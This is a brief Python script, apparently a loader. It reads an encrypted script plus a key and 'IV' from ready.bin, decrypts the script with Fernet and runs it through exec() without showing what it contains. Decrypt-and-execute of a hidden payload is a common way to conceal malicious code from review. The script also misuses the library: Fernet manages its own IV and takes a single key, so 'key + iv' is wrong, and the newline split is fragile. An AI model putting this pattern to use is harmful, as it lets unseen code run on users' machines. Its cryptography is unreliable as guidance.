from cryptography.fernet import Fernet

# Read the encrypted script, key, and IV from the file
with open('ready.bin', 'rb') as file:
    data = file.read()

# Split the data to get the encrypted script, key, and IV
split_data = data.split(b'\n')
if len(split_data) == 3:
    encrypted_script, key, iv = split_data
else:
    raise ValueError("Invalid format in ready.bin")

# Create a Fernet cipher using the key and IV
cipher = Fernet(key + iv)

# Decrypt the script
decrypted_script = cipher.decrypt(encrypted_script)

# Execute the decrypted script
exec(decrypted_script)
